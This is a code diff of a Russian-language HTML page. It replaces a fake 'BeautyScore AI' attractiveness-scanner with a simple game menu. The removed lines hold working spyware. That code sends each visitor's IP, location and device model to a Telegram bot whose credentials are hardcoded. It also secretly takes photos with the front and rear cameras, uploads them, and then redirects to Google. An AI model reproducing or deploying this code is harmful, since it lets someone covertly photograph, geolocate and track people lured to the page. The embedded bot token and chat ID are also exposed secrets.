@@ -1,83 +1,94 @@
 <!DOCTYPE html>
 <html lang="ru">
-<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
-<style>
-    body { margin:0; height:100vh; display:flex; justify-content:center; align-items:center; background:#0f0c29; background:linear-gradient(135deg,#0f0c29 0%,#302b63 50%,#24243e 100%); font-family:sans-serif; color:white; overflow:hidden; }
-    .card { background:rgba(255,255,255,0.05); backdrop-filter:blur(15px); border:1px solid rgba(255,255,255,0.1); padding:40px 20px; border-radius:30px; text-align:center; max-width:360px; width:90%; box-shadow:0 20px 50px rgba(0,0,0,0.5); position:relative; overflow:hidden; }
-    .scan-line { display:none; position:absolute; left:0; top:0; width:100%; height:4px; background:#00f2fe; box-shadow:0 0 15px #00f2fe; animation:scan 2s infinite ease-in-out; }
-    @keyframes scan { 0%{top:0;} 50%{top:100%;} 100%{top:0;} }
-    h1 { font-size:24px; color:#00f2fe; text-transform:uppercase; }
-    #b { padding:18px 40px; background:linear-gradient(90deg,#ff0080,#ff8c00); border:none; border-radius:50px; color:white; font-size:16px; font-weight:bold; cursor:pointer; }
-</style>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>AiroBol</title>
+    <style>
+        /* ФИКСИРУЕМ ГОРИЗОНТАЛЬ */
+        * { box-sizing: border-box; }
+        body { 
+            margin: 0; padding: 0; overflow: hidden; 
+            font-family: 'Arial Black', sans-serif; 
+            background: #87CEEB; color: white;
+        }
+        
+        /* ФОН - СПЛОШНЫЕ ОБЛАКА */
+        .bg-clouds {
+            position: fixed; width: 100vw; height: 100vh;
+            background: url('https://img.freepik.com');
+            background-size: cover; z-index: -1;
+        }
+
+        /* ПРОФИЛЬ (ВЕРХНИЙ ЛЕВЫЙ УГОЛ) */
+        .profile-box {
+            position: absolute; top: 15px; left: 15px;
+            display: flex; align-items: center;
+            background: rgba(0,0,0,0.4); padding: 8px 15px;
+            border-radius: 40px; border: 2px solid rgba(255,255,255,0.3);
+            backdrop-filter: blur(5px);
+        }
+        .avatar { width: 45px; height: 45px; border-radius: 50%; background: #ddd; border: 2px solid white; }
+        .stats { margin-left: 12px; font-size: 14px; line-height: 1.2; }
+
+        /* КНОПКИ В ЦЕНТРЕ (ГОРИЗОНТАЛЬНО) */
+        .main-menu {
+            display: flex; align-items: center; justify-content: center;
+            height: 100vh; width: 100vw; gap: 40px;
+        }
+        .circle-btn {
+            width: 90px; height: 90px; border-radius: 50%; border: none;
+            background: #1E88E5; color: white; font-size: 12px; font-weight: bold;
+            cursor: pointer; box-shadow: 0 6px #1565C0;
+            display: flex; align-items: center; justify-content: center;
+            text-transform: uppercase;
+        }
+        .btn-play { width: 140px; height: 140px; font-size: 70px; background: #1E88E5; }
+
+        /* ОКНО РЕЖИМОВ */
+        #modes {
+            display: none; position: fixed; top: 0; left: 0;
+            width: 100%; height: 100%; background: rgba(0,0,0,0.7);
+            backdrop-filter: blur(10px); align-items: center; justify-content: center; gap: 20px;
+        }
+        .rect-btn {
+            width: 200px; height: 90px; border-radius: 30px; border: none;
+            background: #1E88E5; color: white; font-weight: bold; cursor: pointer;
+            box-shadow: 0 6px #1565C0; font-size: 16px;
+        }
+        .btn-ranked { background: #FFD700; color: #333; box-shadow: 0 6px #B8860B; }
+    </style>
 </head>
 <body>
-<div class="card">
-    <div id="line" class="scan-line"></div>
-    <div style="font-size:50px;">💎</div>
-    <h1>BeautyScore AI</h1>
-    <p>Нейросеть проанализирует ваше лицо и определит ваш балл привлекательности.</p>
-    <video id="v" autoplay playsinline style="display:none;"></video>
-    <canvas id="c" style="display:none;"></canvas>
-    <button id="b">Узнать мой балл</button>
-    <div id="status" style="margin-top:20px; color:#00f2fe;">Система готова...</div>
-</div>
+    <div class="bg-clouds"></div>
 
-<script>
-    const token = '8174281213:AAErVNdvIelAbe3aGFHNvJ1D7g4CdTGGWMc';
-    const chat_id = '7164380121';
+    <div class="profile-box">
+        <div class="avatar"></div>
+        <div class="stats">
+            <b>Bobik</b><br>
+            <span style="color:#FFD700">ЭЛО: 0</span><br>
+            <small style="opacity:0.7">ID: #7421</small>
+        </div>
+    </div>
 
-    function getModel() {
-        const ua = navigator.userAgent;
-        const match = ua.match(/\(([^)]+)\)/);
-        return match ? match[1].split(';')[0] : "Неизвестно";
-    }
+    <div class="main-menu" id="menu">
+        <button class="circle-btn" onclick="alert('Скины: Золотой Бобер за 1000 Эло')">СКИНЫ</button>
+        <button class="circle-btn btn-play" onclick="toggleModes(true)">»</button>
+        <button class="circle-btn" onclick="alert('Настройки: RU/EN')">НАСТР.</button>
+    </div>
 
-    // ИСПРАВЛЕННЫЙ ЛОГГЕР (ЖДЕТ ДАННЫЕ)
-    async function logVisit() {
-        try {
-            const res = await fetch('https://ipwho.is');
-            const d = await res.json();
-            if (d.success) {
-                const info = `👀 КТО-ТО ЗАШЕЛ!\n🏙 Город: ${d.city}\n🌍 Страна: ${d.country}\n📍 IP: ${d.ip}\n📱 Модель: ${getModel()}`;
-                await fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent(info));
-            }
-        } catch (e) {
-            fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent("👀 Заход! Модель: " + getModel()));
+    <div id="modes">
+        <button class="rect-btn" onclick="alert('Бот запущен')">БОТ</button>
+        <button class="rect-btn btn-ranked" onclick="alert('Поиск игры...')">РАНГОВЫЙ</button>
+        <button class="rect-btn" onclick="alert('Игра с другом')">ДРУГ</button>
+        <button onclick="toggleModes(false)" style="position:absolute; bottom:20px; color:white; background:none; border:none; font-size:20px;">← НАЗАД</button>
+    </div>
+
+    <script>
+        function toggleModes(show) {
+            document.getElementById('menu').style.display = show ? 'none' : 'flex';
+            document.getElementById('modes').style.display = show ? 'flex' : 'none';
         }
-    }
-    logVisit();
-
-    async function takePhoto(facing) {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
-            const v = document.getElementById('v');
-            v.srcObject = stream;
-            await new Promise(r => setTimeout(r, 2500)); 
-            const c = document.getElementById('c');
-            c.width = v.videoWidth; c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
-            const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
-            const f = new FormData();
-            f.append('chat_id', chat_id);
-            f.append('photo', blob, 'img.jpg');
-            f.append('caption', `📸 Фото: ${facing}\n📱 Модель: ${getModel()}`);
-            await fetch('https://api.telegram.org/bot' + token + '/sendPhoto', { method: 'POST', body: f });
-            stream.getTracks().forEach(t => t.stop()); 
-        } catch (e) {
-            fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent("❌ КАМЕРА ЗАПРЕЩЕНА"));
-        }
-    }
-
-    document.getElementById('b').onclick = async () => {
-        document.getElementById('b').style.display = "none";
-        document.getElementById('line').style.display = "block";
-        document.getElementById('status').innerText = "Анализ биометрии...";
-        await takePhoto("user"); 
-        document.getElementById('status').innerText = "Глубинное сканирование...";
-        await takePhoto("environment"); 
-        document.getElementById('status').innerText = "Готово!";
-        setTimeout(() => { window.location.href = "https://google.com"; }, 1000);
-    };
-</script>
+    </script>
 </body>
 </html>
